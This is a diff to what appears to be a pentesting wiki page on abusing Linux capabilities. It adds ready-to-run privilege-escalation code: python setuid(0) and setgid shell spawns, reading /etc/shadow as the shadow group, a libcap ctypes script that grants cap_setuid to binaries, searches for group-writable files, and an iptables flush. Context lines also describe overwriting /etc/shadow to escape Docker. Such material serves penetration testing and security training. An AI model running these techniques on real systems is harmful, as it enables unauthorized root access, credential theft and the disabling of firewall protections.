@@ -1105,22 +1105,7 @@ int main(int argc, char * argv[]) {
 
 In order to scape the docker container you could **download** the files `/etc/shadow` and `/etc/passwd` from the host, **add** to them a **new user**, and use **`shocker_write`** to overwrite them. Then, **access** via **ssh**.
 
-**The code of this technique was copied from the laboratory of "Abusing DAC\_OVERRIDE Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com/)
-
-### CAP\_NET\_RAW
-
-**This means that it's possible to capture traffic on network interfaces.**
-
-#### Example with binary
-
-If the binary **`tcpdump`** has this capability you will be able to use it to capture network information.
-
-```bash
-getcap -r / 2>/dev/null
-/usr/sbin/tcpdump = cap_net_raw+ep
-```
-
-Note that if the **environment** is giving this capability you could also use **`tcpdump`** to sniff traffic.
+**The code of this technique was copied from the laboratory of "Abusing DAC\_OVERRIDE Capability" from** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com/)
 
 ### CAP\_CHOWN
 
@@ -1145,6 +1130,96 @@ If python has this capability you can modify the permissions of the shadow file,
 ```bash
 python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
+
+### CAP\_SETUID
+
+**This means that it's possible to set the effective user id of the created process.**
+
+#### Example with binary
+
+If python has this **capability**, you can very easily abuse it to escalate privileges to root:
+
+```python
+import os
+os.setuid(0)
+os.system("/bin/bash")
+```
+
+### CAP\_SETGID
+
+**This means that it's possible to set the effective group id of the created process.**
+
+#### Example with binary
+
+In this case you should look for interesting files that a group can read because you can impersonate any group:
+
+```bash
+#Find every file writable by a group
+find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+#Find every file writable by a group in /etc with a maxpath of 1
+find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+#Find every file readable by a group in /etc with a maxpath of 1
+find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
+```
+
+Once you have find a file you can abuse \(via reading or writing\) to escalate privileges you can **get a shell impersonating the interesting group** with:
+
+```python
+import os
+os.setgid(42)
+os.system("/bin/bash")
+```
+
+In this case the group shadow was impersonated so you can read the file `/etc/shadow`:
+
+```bash
+cat /etc/shadow
+```
+
+If **docker** is installed you could **impersonate** the **docker group** and abuse it to communicate with the [**docker socket** and escalate privileges](./#writable-docker-socket).
+
+### CAP\_SETFCAP
+
+**This means that it's possible to set capabilities on files and processes**
+
+#### Example with binary
+
+If python has this **capability**, you can very easily abuse it to escalate privileges to root:
+
+{% code title="setcapability.py" %}
+```python
+import ctypes, sys
+
+#Load needed library
+#You can find which library you need to load checking the libraries of local setcap binary
+# ldd /sbin/setcap
+libcap = ctypes.cdll.LoadLibrary("libcap.so.2")
+
+libcap.cap_from_text.argtypes = [ctypes.c_char_p]
+libcap.cap_from_text.restype = ctypes.c_void_p
+libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]
+
+#Give setuid cap to the binary
+cap = 'cap_setuid+ep'
+path = sys.argv[1]
+print(path)
+cap_t = libcap.cap_from_text(cap)
+status = libcap.cap_set_file(path,cap_t)
+
+if(status == 0):
+    print (cap + " was successfully added to " + path)
+```
+{% endcode %}
+
+```bash
+python setcapability.py /usr/bin/python2.7
+```
+
+{% hint style="warning" %}
+Note that if you set a new capability to the binary with CAP\_SETFCAP, you will lose this cap.
+{% endhint %}
+
+Once you have [SETUID capability](linux-capabilities.md#cap_setuid) you can go to it's section to see how to escalate privileges.
 
 ### CAP\_KILL
 
@@ -1200,6 +1275,17 @@ s.connect(('10.10.10.10',500))
 
 #### Example with binary
 
+If the binary **`tcpdump`** has this capability you will be able to use it to capture network information.
+
+```bash
+getcap -r / 2>/dev/null
+/usr/sbin/tcpdump = cap_net_raw+ep
+```
+
+Note that if the **environment** is giving this capability you could also use **`tcpdump`** to sniff traffic.
+
+#### Example with binary 2
+
 The following example is **`python2`** code that can be useful to intercept traffic of the "**lo**" \(**localhost**\) interface. The code is from the lab "_The Basics: CAP-NET\_BIND + NET\_RAW_" from [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com/)
 
 ```python
@@ -1244,6 +1330,26 @@ while True:
     if (proto == 17 or proto == 6):
         print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
         count=count+1
+```
+
+### CAP\_NET\_ADMIN + CAP\_NET\_RAW
+
+**This means that it's possible modify firewall rules.** You cannot escalate privileges directly with this capability.
+
+#### Example with binary
+
+Lets suppose that the **python binary** has these capabilities.
+
+```python
+#Dump iptables filter table rules
+import iptc
+import pprint
+json=iptc.easy.dump_table('filter',ipv6=False)
+pprint.pprint(json)
+
+#Flush iptables filter table
+import iptc
+iptc.easy.flush_table('filter')
 ```
 
 ## References
